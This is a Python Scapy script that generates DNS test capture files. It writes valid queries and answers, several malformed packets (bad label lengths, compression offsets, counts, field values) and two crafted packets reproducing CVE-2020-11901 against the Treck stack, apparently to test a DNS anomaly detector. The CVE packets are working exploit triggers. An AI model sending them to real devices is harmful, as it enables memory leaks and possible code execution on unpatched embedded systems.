from scapy.all import *


# PCAP1 - Valid compressed and uncompressed answer

# Compressed response
pkt = dns_compress(
Ether()/
IP(dst="10.0.0.1")/
UDP(sport=53)/
DNS(length=None, id=25156, qr=1, opcode=0, aa=0, tc=0, rd=1,
ra=1, z=0, ad=0, cd=0, rcode=0, qdcount=1, ancount=1, nscount=0, arcount=1,
qd=DNSQR(qname=b'google.google.google.com', qtype=1, qclass=1),
an=DNSRR(rrname=b'google.google.google.com', type=1, rclass=1, ttl=300, rdlen=None, rdata='10.0.0.1'),
ns=None, ar=DNSRROPT(rrname=b'.', type=41, rclass=1280, extrcode=0, version=0, z=0, rdlen=None)))

wrpcap("whitelist_compressed_answer.pcap", pkt)

# PCAP2 - Valid simple query
pkts = []
# Send A query 
pkts.append(Ether()/IP(src="10.0.0.1",dst="10.0.0.2")/
			UDP(sport=12345, dport=53)/
			DNS(id=25156,rd=1,qd=DNSQR(qname="google.com",qtype="A",qclass="IN")))

wrpcap("whitelist_simple_query.pcap", pkts)


# PCAP3 - Simple answer, wrong label size(#AP2)

# txid(4), flags(4), qcount(4), ancount(4), authority_rr(4), additional_rr(4)
header = b"\x62\x44\x81\x80\x00\x01\x00\x01\x00\x00\x00\x01"
first_query = b"\x06\x67\x6f\x6f\x67\x6c\x65\xff\x67\x6f\x6f\x67\x6c\x65\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\x01\x00\x01"

# Correct compressed offset should be 0x0c instead 0xff
second_query = b"\xc0\x0c\x00\x01\x00\x01\x00\x00\x01\x2c\x00\x04\x0a\x00\x00\x01\x00\x00\x29\x05\x00\x00\x00\x00\x00\x00\x00"

pkt = Ether()/IP(dst="10.0.0.1")/UDP(sport=53)/Raw(load=header + first_query + second_query)

wrpcap("ap2_wrong_label_size.pcap", pkt)

# PCAP4 - Simple query, missing null terminator

# txid(4), flags(4), qcount(4), ancount(4), authority_rr(4), additional_rr(4)
header = b"\x62\x44\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
query = b"\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\xff\x00\x01\x00\x01"

pkt = Ether()/IP(dst="10.0.0.1")/UDP(sport=53)/Raw(load=header + query)

wrpcap("ap3_missing_null_terminator.pcap", pkt)

# PCAP5- Simple answer, wrong qcount, ancount, authority_rr, additional_rr values(bigger values)

# txid(4), flags(4), qcount(4), ancount(4), authority_rr(4), additional_rr(4)
header = b"\x62\x44\x81\x80\x00\xFF\x00\xFF\x00\xFF\x00\xFF"
first_query = b"\x06\x67\x6f\x6f\x67\x6c\x65\x06\x67\x6f\x6f\x67\x6c\x65\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\x01\x00\x01"

# Correct compressed offset should be 0x0c instead 0xff
second_query = b"\xc0\x0c\x00\x01\x00\x01\x00\x00\x01\x2c\x00\x04\x0a\x00\x00\x01\x00\x00\x29\x05\x00\x00\x00\x00\x00\x00\x00"

pkt = Ether()/IP(dst="10.0.0.1")/UDP(sport=53)/Raw(load=header + first_query + second_query)

wrpcap("ap4_wrong_counts.pcap", pkt)


# PCAP6 - Simple answer, wrong compression offset byte 

# txid(4), flags(4), qcount(4), ancount(4), authority_rr(4), additional_rr(4)
header = b"\x62\x44\x81\x80\x00\x01\x00\x01\x00\x00\x00\x01"
first_query = b"\x06\x67\x6f\x6f\x67\x6c\x65\x06\x67\x6f\x6f\x67\x6c\x65\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\x01\x00\x01"

# Correct compressed offset should be 0x0c instead 0xff
second_query = b"\xc0\xff\x00\x01\x00\x01\x00\x00\x01\x2c\x00\x04\x0a\x00\x00\x01\x00\x00\x29\x05\x00\x00\x00\x00\x00\x00\x00"

pkt = Ether()/IP(dst="10.0.0.1")/UDP(sport=53)/Raw(load=header + first_query + second_query)

wrpcap("ap5_wrong_compression_offset.pcap", pkt)


# PCAP7 - Simple answer, wrong Z value

# txid(4), flags(4), qcount(4), ancount(4), authority_rr(4), additional_rr(4)
header = b"\x62\44\x81\xf0\x00\x01\x00\x01\x00\x00\x00\x01"
first_query = b"\x06\x67\x6f\x6f\x67\x6c\x65\x06\x67\x6f\x6f\x67\x6c\x65\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\x01\x00\x01"
print(header)
# Correct compressed offset should be 0x0c instead 0xff
second_query = b"\xc0\x0c\x00\x01\x00\x01\x00\x00\x01\x2c\x00\x04\x0a\x00\x00\x01\x00\x00\x29\x05\x00\x00\x00\x00\x00\x00\x00"

pkt = Ether()/IP(dst="10.0.0.1")/UDP(sport=53)/Raw(load=header + first_query + second_query)

wrpcap("static_non_zero_Z.pcap", pkt)

# PCAP8 - Simple answer, ge 16 Resource_record type

pkt = (Ether()/
IP(dst="10.0.0.1")/
UDP(sport=53)/
DNS(length=None, id=25156, qr=1, opcode=0, aa=0, tc=0, rd=1,
ra=1, z=0, ad=0, cd=0, rcode=0, qdcount=1, ancount=1, nscount=0, arcount=1,
qd=DNSQR(qname=b'google.google.google.com', qtype=1, qclass=1),
an=DNSRR(rrname=b'google.google.google.com', type=0xff, rclass=1, ttl=300, rdlen=None, rdata='10.0.0.1'),
ns=None, ar=DNSRROPT(rrname=b'.', type=41, rclass=1280, extrcode=0, version=0, z=65535, rdlen=None)))

wrpcap("static_rr_type_ge_16.pcap", pkt)

# PCAP9 - Simple answer, ge 4 Resource_record CLASS

pkt = (Ether()/
IP(dst="10.0.0.1")/
UDP(sport=53)/
DNS(length=None, id=25156, qr=1, opcode=0, aa=0, tc=0, rd=1,
ra=1, z=0, ad=0, cd=0, rcode=0, qdcount=1, ancount=1, nscount=0, arcount=1,
qd=DNSQR(qname=b'google.google.google.com', qtype=1, qclass=1),
an=DNSRR(rrname=b'google.google.google.com', type=0x1, rclass=0xffff, ttl=300, rdlen=None, rdata='10.0.0.1'),
ns=None, ar=DNSRROPT(rrname=b'.', type=41, rclass=1280, extrcode=0, version=0, z=65535, rdlen=None)))

wrpcap("static_rr_class_ge_4.pcap", pkt)

# PCAP10 - Simple answer, QCLASS.QCLASS between 4 and 255

pkt = (Ether()/
IP(dst="10.0.0.1")/
UDP(sport=53)/
DNS(length=None, id=25156, qr=1, opcode=0, aa=0, tc=0, rd=1,
ra=1, z=0, ad=0, cd=0, rcode=0, qdcount=1, ancount=1, nscount=0, arcount=1,
qd=DNSQR(qname=b'google.google.google.com', qtype=1, qclass=10),
an=DNSRR(rrname=b'google.google.google.com', type=0x1, rclass=1, ttl=300, rdlen=None, rdata='10.0.0.1'),
ns=None, ar=DNSRROPT(rrname=b'.', type=41, rclass=1280, extrcode=0, version=0, z=0, rdlen=None)))

wrpcap("static_rr_qclass_ge_4_le_255.pcap", pkt)

# PCAP11 - Simple answer, RCODE ge 64

pkt = (Ether()/
IP(dst="10.0.0.1")/
UDP(sport=53)/
DNS(length=None, id=25156, qr=1, opcode=0, aa=0, tc=0, rd=1,
ra=1, z=0, ad=0, cd=0, rcode=0xff, qdcount=1, ancount=1, nscount=0, arcount=1,
qd=DNSQR(qname=b'google.google.google.com', qtype=1, qclass=10),
an=DNSRR(rrname=b'google.google.google.com', type=0x1, rclass=1, ttl=300, rdlen=None, rdata='10.0.0.1'),
ns=None, ar=DNSRROPT(rrname=b'.', type=41, rclass=1280, extrcode=0, version=0, z=0, rdlen=None)))

wrpcap("static_rcode_ge_4.pcap", pkt)

#CVE-2020-11901, https://finitestate.io/blog/the-aftershock-of-ripple20

pkts = []
leak = raw(DNSRRMX(rrname='www.example.com',
   type="MX",
   rdlen=None,
   exchange = b'www.example2.com'))[:-1] + b'\x3f'
full_pkt = IP(src='192.168.1.66', dst='196.168.0.50')/UDP()/DNS(opcode="IQUERY", qr=1, aa=1, rd=0, qdcount=0, ancount=1)/Raw(leak)

pkts.append(full_pkt)

#CVE-2020-11901
dns_pkt = raw(DNS(qr=1, aa=1, rd=1, qdcount=1, ancount=1))
matrix_bytes = [0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x00, 0x0E, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F,0x0F, 0xC0, 0x0D, 0x0D, 0x0E, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0xC0, 0x0E, 0xC0, 0x0F, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0xC0, 0x10, 0xC0, 0x11, 0xC0, 0x12, 0xC0, 0x13, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0xC0, 0x14, 0xC0, 0x15, 0xC0, 0x16, 0xC0, 0x17, 0xC0, 0x18, 0xC0, 0x19, 0xC0, 0x1A, 0xC0,0x1B]

qr_raw = b'\x0f' + bytes(matrix_bytes) + b'\x00\x05\x00\x01'
an_raw = raw(DNSRRMX(rrname=b'www.example.com',
   exchange=b'\x07payload\xc0\x1c', type="MX"))
full_dns_pkt = Raw(dns_pkt) / Raw(qr_raw) / Raw(an_raw)
full_pkt = IP(src='192.168.1.66', dst='196.168.0.50')/UDP()/Raw(full_dns_pkt)

pkts.append(full_pkt)
wrpcap("CVE-2020-11901.pcap", pkts)


